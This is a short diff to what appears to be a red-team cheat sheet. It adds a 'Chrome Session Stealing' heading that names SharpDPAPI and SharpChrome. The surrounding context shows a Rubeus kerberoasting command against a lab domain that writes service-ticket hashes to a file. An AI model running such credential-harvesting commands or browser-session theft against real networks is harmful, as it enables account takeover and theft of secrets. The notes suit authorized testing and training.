@@ -90,6 +90,12 @@ Kerberoast specific user:
 # execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHash.txt /user:testaccount /domain:lab.com
 ```
 
+-------------------------------------------------
+## Exploitation
+
+### Chrome Session Stealing
+SharpDPAPI and SharpChrome
+
 ---
 ## Exfiltration - Password Attacks
 
